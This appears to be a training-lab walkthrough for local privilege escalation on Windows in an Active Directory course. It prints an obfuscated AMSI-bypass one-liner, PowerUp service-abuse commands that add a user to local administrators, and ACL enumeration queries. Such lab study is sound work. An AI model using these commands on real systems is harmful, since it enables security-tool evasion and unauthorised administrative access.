# Hands-on 5: Local Privilege Escalation

- [Hands-on 5: Local Privilege Escalation](#hands-on-5-local-privilege-escalation)
  - [Tasks](#tasks)
  - [Exploit a service on studentx and elevate privileges to local administrator](#exploit-a-service-on-studentx-and-elevate-privileges-to-local-administrator)
  - [Identify a machine in the domain where studentuserx has local administrative access due to group membership](#identify-a-machine-in-the-domain-where-studentuserx-has-local-administrative-access-due-to-group-membership)

---

## Tasks

- Exploit a service on studentx and elevate privileges to local administrator. 
- Identify a machine in the domain where studentuserx has local administrative access due to group membership.

<br/>

---

## Exploit a service on studentx and elevate privileges to local administrator

First import PowerUp.ps1:

```
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.'+$([chAR]([BYte]0x41)+[cHAr](109)+[ChAR](12650/110)+[CHAr](105))+'Utils').GetField($([cHAR]([bYte]0x61)+[CHAR](144-35)+[ChAR]([byTE]0x73)+[Char]([byTE]0x69)+[CHar](67)+[chaR](14+97)+[chaR](77+33)+[char](91+25)+[chAr](2424/24)+[cHAR](126-6)+[chAR]([BYTe]0x74)),[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x39AF8D70);
```

```
. C:\AD\Tools\PowerUp.ps1
```

<br/>

Run all checks:

```
Invoke-AllChecks
```

![picture 46](images/34b873a23fd9ca7b21278c40dfe55d9ca82c6bc9c51d89a2ac26e7f2df9b63d6.png)  

- Vulnerable Serivce: `ALG`

<br/>

Use the ServiceAbuse function to add `us\studentuser64` into local admin group:

```
Invoke-ServiceAbuse -Name 'ALG' -Command 'net localgroup administrators us\studentuser64 /add'
```

![picture 47](images/36fc584a19bfe3d2209b3d370f73b595203fcc675d353ddc901b78b991969b76.png)  

<br/>

Check the local admins group:

```
net localgroup administrators
```

![picture 48](images/7ebcc60fab46af8d63c4c21b610090f761a7ddb3946f80936e3c0b209d924b32.png)  

<br/>

---

## Identify a machine in the domain where studentuserx has local administrative access due to group membership

`Find-LocalAdminAccess` won't return any result.

<br/>

Check group membership of the current user:

```
Get-DomainGroup -UserName studentuser64 | Select distinguishedname
```

![picture 49](images/1548d02de70592dbfa62255c5e785810e8d6d3abfa58173accc951e403018228.png)  

<br/>

Check interesting ACLs:

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{ ($_.IdentityReferenceName -match "manager") -or ($_.IdentityReferenceName -match "studentusers") -or ($_.IdentityReferenceName -match "maintenanceusers") }
```

